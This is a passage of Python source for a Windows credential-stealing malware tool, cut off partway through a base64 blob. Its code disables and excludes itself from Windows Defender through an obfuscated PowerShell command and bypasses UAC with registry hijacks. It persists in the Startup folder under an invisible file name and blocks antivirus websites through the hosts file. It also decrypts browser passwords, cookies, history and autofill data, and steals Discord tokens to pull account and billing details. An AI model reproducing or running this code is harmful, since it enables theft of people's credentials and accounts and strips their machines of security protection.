        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def ExcludeFromDefender(path: str=None) -> None:
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def GetRandomString(length: int=5, invisible: bool=False):
        if invisible:
            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        else:
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    @staticmethod
    def GetWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()
        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                name = line[line.find(':') + 1:].strip()
                profiles.append(name)
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[line.find(':') + 1:].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def GetLnkTarget(path_to_lnk: str) -> str | None:
        target = None
        if os.path.isfile(path_to_lnk):
            output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace('\\', '\\\\'), shell=True, capture_output=True).stdout.decode()
            if output:
                for line in output.splitlines():
                    if line.startswith('Target='):
                        temp = line.lstrip('Target=').strip()
                        if os.path.exists(temp):
                            target = temp
                            break
        return target

    @staticmethod
    def GetLnkFromStartMenu(app: str) -> list[str]:
        shortcutPaths = []
        startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == '%s.lnk' % app.lower():
                        shortcutPaths.append(os.path.join(root, file))
        return shortcutPaths

    @staticmethod
    def IsAdmin() -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    @staticmethod
    def UACbypass(method: int=1) -> bool:
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
            match method:
                case 1:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('computerdefaults --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case 2:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('fodhelper --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case _:
                    return False
            return True

    @staticmethod
    def IsInStartup() -> bool:
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == 'startup'

    @staticmethod
    def PutInStartup() -> str:
        STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
        file, isExecutable = Utility.GetSelf()
        if isExecutable:
            out = os.path.join(STARTUPDIR, '{}.scr'.format(Utility.GetRandomString(invisible=True)))
            os.makedirs(STARTUPDIR, exist_ok=True)
            try:
                shutil.copy(file, out)
            except Exception:
                return None
            return out

    @staticmethod
    def IsConnectedToInternet() -> bool:
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
        except Exception:
            return False

    @staticmethod
    def DeleteSelf():
        path, isExecutable = Utility.GetSelf()
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)

    @staticmethod
    def HideSelf() -> None:
        path, _ = Utility.GetSelf()
        subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def BlockSites() -> None:
        if Utility.IsAdmin():
            call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
            if call.returncode != 0:
                hostdirpath = os.path.join('System32', 'drivers', 'etc')
            else:
                hostdirpath = os.sep.join(call.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
            hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath, 'hosts')
            if not os.path.isfile(hostfilepath):
                return
            with open(hostfilepath) as file:
                data = file.readlines()
            BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
            newdata = []
            for i in data:
                if any([x in i for x in BANNED_SITES]):
                    continue
                else:
                    newdata.append(i)
            for i in BANNED_SITES:
                newdata.append('\t0.0.0.0 {}'.format(i))
                newdata.append('\t0.0.0.0 www.{}'.format(i))
            newdata = '\n'.join(newdata).replace('\n\n', '\n')
            subprocess.run('attrib -r {}'.format(hostfilepath), shell=True, capture_output=True)
            with open(hostfilepath, 'w') as file:
                file.write(newdata)
            subprocess.run('attrib +r {}'.format(hostfilepath), shell=True, capture_output=True)

class Browsers:

    class Chromium:
        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath):
                raise NotADirectoryError('Browser path not found!')
            self.BrowserPath = browserPath

        def GetEncryptionKey(self) -> bytes | None:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            else:
                localStatePath = os.path.join(self.BrowserPath, 'Local State')
                if os.path.isfile(localStatePath):
                    with open(localStatePath, encoding='utf-8', errors='ignore') as file:
                        jsonContent: dict = json.load(file)
                    encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey
                else:
                    return None

        def Decrypt(self, buffer: bytes, key: bytes) -> str:
            version = buffer.decode(errors='ignore')
            if version.startswith(('v10', 'v11')):
                iv = buffer[3:15]
                cipherText = buffer[15:]
                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors='ignore')
            else:
                return str(Syscalls.CryptUnprotectData(buffer))

        def GetPasswords(self) -> list[tuple[str, str, str]]:
            encryptionKey = self.GetEncryptionKey()
            passwords = list()
            if encryptionKey is None:
                return passwords
            loginFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'login data':
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)
                        if url and username and password:
                            passwords.append((url, username, password))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return passwords

        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
            encryptionKey = self.GetEncryptionKey()
            cookies = list()
            if encryptionKey is None:
                return cookies
            cookiesFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'cookies':
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)
                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return cookies

        def GetHistory(self) -> list[tuple[str, str, int]]:
            history = list()
            historyFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)
            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                    for url, title, vc, lvt in results:
                        if url and title and (vc is not None) and (lvt is not None):
                            history.append((url, title, vc, lvt))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            history.sort(key=lambda x: x[3], reverse=True)
            return list([(x[0], x[1], x[2]) for x in history])

        def GetAutofills(self) -> list[str]:
            autofills = list()
            autofillsFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'web data':
                        filepath = os.path.join(root, file)
                        autofillsFilePaths.append(filepath)
            for path in autofillsFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]
                    for data in results:
                        data = data.strip()
                        if data and (not data in autofills):
                            autofills.append(data)
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return autofills

class Discord:
    httpClient = PoolManager(cert_reqs='CERT_NONE')
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

    @staticmethod
    def GetHeaders(token: str=None) -> dict:
        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
        if token:
            headers['authorization'] = token
        return headers

    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()
        paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
        for name, path in paths.items():
            if os.path.isdir(path):
                if name == 'FireFox':
                    t = Thread(target=lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target=lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)
                    t = Thread(target=lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)
        for thread in threads:
            thread.join()
        tokens = [*set(tokens)]
        for token in tokens:
            r: HTTPResponse = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode(errors='ignore')
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified = r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors='ignore'))
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)
                        match method_type:
                            case 1:
                                methods['Card'] += 1
                            case 2:
                                methods['Paypal'] += 1
                            case _:
                                methods['Unknown'] += 1
                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode(errors='ignore')
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone, 'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()
        localStatePath = os.path.join(path, 'Local State')
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        if os.path.isfile(localStatePath) and levelDbPaths:
            with open(localStatePath, errors='ignore') as file:
                jsonContent: dict = json.load(file)
            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith(('.log', '.ldb')):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in encryptedTokens:
                                        match = base64.b64decode(match.split('dQw4w9WgXcQ:')[1].encode())
                                        encryptedTokens.append(match)
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
                if token:
                    tokens.append(token)
            except Exception:
                pass
        return tokens

    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()
        levelDbPaths = list()
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith(('.log', '.ldb')):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
                            for match in matches:
                                match = match.rstrip('\\')
                                if not match in tokens:
                                    tokens.append(match)
        return tokens

    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()
        for root, _, files in os.walk(path):
            for file in files:
                if file.lower().endswith('.sqlite'):
                    filepath = os.path.join(root, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in tokens:
                                        tokens.append(match)
        return tokens

    @staticmethod
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiBkYXRhLWNvbG9yLW1vZGU9ImF1dG8iIGRhdGEtbGlnaHQtdGhlbWU9ImxpZ2h0IiBkYXRhLWRhcmstdGhlbWU9ImRhcmsiICBkYXRhLWExMXktYW5pbWF0ZWQtaW1hZ2VzPSJzeXN0ZW0iIGRhdGEtYTExeS1saW5rLXVuZGVybGluZXM9InRydWUiPgoKCgogIDxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogIDxsaW5rIHJlbD0iZG5zLXByZWZldGNoIiBocmVmPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tIj4KICA8bGluayByZWw9ImRucy1wcmVmZXRjaCIgaHJlZj0iaHR0cHM6Ly9hdmF0YXJzLmdpdGh1YnVzZXJjb250ZW50LmNvbSI+CiAgPGxpbmsgcmVsPSJkbnMtcHJlZmV0Y2giIGhyZWY9Imh0dHBzOi8vZ2l0aHViLWNsb3VkLnMzLmFtYXpvbmF3cy5jb20iPgogIDxsaW5rIHJlbD0iZG5zLXByZWZldGNoIiBocmVmPSJodHRwczovL3VzZXItaW1hZ2VzLmdpdGh1YnVzZXJjb250ZW50LmNvbS8iPgogIDxsaW5rIHJlbD0icHJlY29ubmVjdCIgaHJlZj0iaHR0cHM6Ly9naXRodWIuZ2l0aHViYXNzZXRzLmNvbSIgY3Jvc3NvcmlnaW4+CiAgPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2F2YXRhcnMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIj4KCiAgCgoKICA8bGluayBjcm9zc29yaWdpbj0iYW5vbnltb3VzIiBtZWRpYT0iYWxsIiByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmdpdGh1YmFzc2V0cy5jb20vYXNzZXRzL2xpZ2h0LWI5MmU5NjQ3MzE4Zi5jc3MiIC8+PGxpbmsgY3Jvc3NvcmlnaW49ImFub255bW91cyIgbWVkaWE9ImFsbCIgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Fzc2V0cy9kYXJrLTVkNDg2YTRlZGU4ZS5jc3MiIC8+PGxpbmsgZGF0YS1jb2xvci10aGVtZT0iZGFya19kaW1tZWQiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIG1lZGlhPSJhbGwiIHJlbD0ic3R5bGVzaGVldCIgZGF0YS1ocmVmPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Fzc2V0cy9kYXJrX2RpbW1lZC0yN2M4ZDYzNWU0ZTUuY3NzIiAvPjxsaW5rIGRhdGEtY29sb3ItdGhlbWU9ImRhcmtfaGlnaF9jb250cmFzdCIgY3Jvc3NvcmlnaW49ImFub255bW91cyIgbWVkaWE9ImFsbCIgcmVsPSJzdHlsZXNoZWV0IiBkYXRhLWhyZWY9Imh0dHBzOi8vZ2l0aHViLmdpdGh1YmFzc2V0cy5jb20vYXNzZXRzL2RhcmtfaGlnaF9jb250cmFzdC04NDM4ZTc1YWZkMzYuY3NzIiAvPjxsaW5rIGRhdGEtY29sb3ItdGhlbWU9ImRhcmtfY29sb3JibGluZCIgY3Jvc3NvcmlnaW49ImFub255bW91cyIgbWVkaWE9ImFsbCIgcmVsPSJzdHlsZXNoZWV0IiBkYXRhLWhyZWY9Imh0dHBzOi8vZ2l0aHViLmdpdGh1YmFzc2V0cy5jb20vYXNzZXRzL2RhcmtfY29sb3JibGluZC1iZjU2NjViOTY2MjguY3NzIiAvPjxsaW5rIGRhdGEtY29sb3ItdGhlbWU9ImxpZ2h0X2NvbG9yYmxpbmQiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIG1lZGlhPSJhbGwiIHJlbD0ic3R5bGVzaGVldCIgZGF0YS1ocmVmPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Fzc2V0cy9saWdodF9jb2xvcmJsaW5kLWM0MTRiNWJhMWRjZS5jc3MiIC8+PGxpbmsgZGF0YS1jb2xvci10aGVtZT0ibGlnaHRfaGlnaF9jb250cmFzdCIgY3Jvc3NvcmlnaW49ImFub255bW91cyIgbWVkaWE9ImFsbCIgcmVsPSJzdHlsZXNoZWV0IiBkYXRhLWhyZWY9Imh0dHBzOi8vZ2l0aHViLmdpdGh1YmFzc2V0cy5jb20vYXNzZXRzL2xpZ2h0X2hpZ2hfY29udHJhc3QtZTU4NjhiNzM3NGRiLmNzcyIgLz48bGluayBkYXRhLWNvbG9yLXRoZW1lPSJsaWdodF90cml0YW5vcGlhIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIiBtZWRpYT0iYWxsIiByZWw9InN0eWxlc2hlZXQiIGRhdGEtaHJlZj0iaHR0cHM6Ly9naXRodWIuZ2l0aHViYXNzZXRzLmNvbS9hc3NldHMvbGlnaHRfdHJpdGFub3BpYS0yOTlhYzljNjRlYzAuY3NzIiAvPjxsaW5rIGRhdGEtY29sb3ItdGhlbWU9ImRhcmtfdHJpdGFub3BpYSIgY3Jvc3NvcmlnaW49ImFub255bW91cyIgbWVkaWE9ImFsbCIgcmVsPSJzdHlsZXNoZWV0IiBkYXRhLWhyZWY9Imh0dHBzOi8vZ2l0aHViLmdpdGh1YmFzc2V0cy5jb20vYXNzZXRzL2RhcmtfdHJpdGFub3BpYS0zYTI2ZTc4YWQwZmYuY3NzIiAvPgogICAgPGxpbmsgY3Jvc3NvcmlnaW49ImFub255bW91cyIgbWVkaWE9ImFsbCIgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Fzc2V0cy9wcmltZXItcHJpbWl0aXZlcy0zNjNlYzE4MzFjMjYuY3NzIiAvPgogICAgPGxpbmsgY3Jvc3NvcmlnaW49ImFub255bW91cyIgbWVkaWE9ImFsbCIgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Fzc2V0cy9wcmltZXItMGNkYzYwN2E1NTE3LmNzcyIgLz4KICAgIDxsaW5rIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIG1lZGlhPSJhbGwiIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9naXRodWIuZ2l0aHViYXNzZXRzLmNvbS9hc3NldHMvZ2xvYmFsLWIyMjk4MzQwZmQ1Yi5jc3MiIC8+CiAgICA8bGluayBjcm9zc29yaWdpbj0iYW5vbnltb3VzIiBtZWRpYT0iYWxsIiByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmdpdGh1YmFzc2V0cy5jb20vYXNzZXRzL2dpdGh1Yi1mMmVhZmIyYTU1YWEuY3NzIiAvPgogIDxsaW5rIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIG1lZGlhPSJhbGwiIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9naXRodWIuZ2l0aHViYXNzZXRzLmNvbS9hc3NldHMvY29kZS03MWVjZDU2MzhmYmYuY3NzIiAvPgoKICAKCiAgPHNjcmlwdCB0eXBlPSJhcHBsaWNhdGlvbi9qc29uIiBpZD0iY2xpZW50LWVudiI+eyJsb2NhbGUiOiJlbiIsImZlYXR1cmVGbGFncyI6WyJmYWlsYm90X2hhbmRsZV9ub25fZXJyb3JzIiwiZ2VvanNvbl9henVyZV9tYXBzIiwiaW1hZ2VfbWV0cmljX3RyYWNraW5nIiwidHVyYm9fZXhwZXJpbWVudF9yaXNreSIsInNhbXBsZV9uZXR3b3JrX2Nvbm5fdHlwZSIsInVwbG9hZF9tYW5pZmVzdF9zdGF0dXMiXX08L3NjcmlwdD4KPHNjcmlwdCBjcm9zc29yaWdpbj0iYW5vbnltb3VzIiBkZWZlcj0iZGVmZXIiIHR5cGU9ImFwcGxpY2F0aW9uL2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9naXRodWIuZ2l0aHViYXNzZXRzLmNvbS9hc3NldHMvd3AtcnVudGltZS03YzFkZTdmMDFlNmEuanMiPjwvc2NyaXB0Pgo8c2NyaXB0IGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIGRlZmVyPSJkZWZlciIgdHlwZT0iYXBwbGljYXRpb24vamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Fzc2V0cy92ZW5kb3JzLW5vZGVfbW9kdWxlc19kb21wdXJpZnlfZGlzdF9wdXJpZnlfanMtNjg5MGU4OTA5NTZmLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBjcm9zc29yaWdpbj0iYW5vbnltb3VzIiBkZWZlcj0iZGVmZXIiIHR5cGU9ImFwcGxpY2F0aW9uL2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9naXRodWIuZ2l0aHViYXNz